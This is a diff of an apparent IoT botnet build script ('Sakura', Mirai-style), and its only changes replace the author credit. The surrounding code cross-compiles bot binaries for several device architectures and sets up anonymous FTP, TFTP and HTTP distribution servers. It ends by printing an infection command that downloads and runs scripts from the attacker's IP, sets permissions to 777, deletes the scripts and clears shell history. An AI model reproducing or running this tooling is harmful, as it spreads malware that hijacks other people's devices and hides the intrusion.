@@ -1,5 +1,5 @@
 import subprocess, sys
-#Made By Zinqo.
+#Made By leoniofficials.
 if len(sys.argv[2]) != 0:
     ip = sys.argv[2]
 else:
@@ -12,7 +12,7 @@ if Sakura.lower() == "":
     get_arch = True
 else:
     get_arch = False
-#Made By Zinqo.
+#Made By leoniofficials.
 compileas = ["m-i.p-s.Sakura" ,
              "m-p.s-l.Sakura" ,
              "s-h.4-.Sakura",
@@ -53,7 +53,7 @@ ccs = ["cross-compiler-mips",
        "cross-compiler-armv4l",
        "cross-compiler-armv4l",
        "cross-compiler-armv5l"]
-#Made By Zinqo.
+#Made By leoniofficials.
 def run(cmd):
     subprocess.call(cmd, shell=True)
 
@@ -66,7 +66,7 @@ if get_arch == True:
         run("wget " + arch + " --no-check-certificate >> /dev/null")
         run("tar -xvf *tar.bz2")
         run("rm -rf *tar.bz2")
-#Made By Zinqo.
+#Made By leoniofficials.
 num = 0
 for cc in ccs:
     arch = cc.split("-")[2]
@@ -78,9 +78,9 @@ run("service httpd start")
 run("yum install xinetd tftp tftp-server -y")
 run("yum install vsftpd -y")
 run("service vsftpd start")
-#Made By Zinqo.
+#Made By leoniofficials.
 run('''echo -e "# default: off
-#Made By Zinqo.
+#Made By leoniofficials.
 service tftp
 {
         socket_type             = dgram
@@ -96,7 +96,7 @@ service tftp
 }
 " > /etc/xinetd.d/tftp''')
 run("service xinetd start")
-#Made By Zinqo.
+#Made By leoniofficials.
 run('''echo -e "listen=YES
 local_enable=NO
 anonymous_enable=YES
@@ -117,7 +117,7 @@ run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp1.sh')
 run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp1.sh')
 
 run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1.sh')
-#Made By Zinqo.
+#Made By leoniofficials.
 run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp2.sh')
 
 run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh')
@@ -134,5 +134,6 @@ for i in compileas:
 run("service xinetd restart")
 run("service httpd restart")
 run('echo -e "ulimit -n 99999" >> ~/.bashrc')
-#Made By Zinqo.
+#Made By leoniofficials.
 print("\x1b[1;95mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/Sakura.sh; chmod 777 *; sh Sakura.sh; tftp -g " + ip + " -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c\x1b[0m")
+
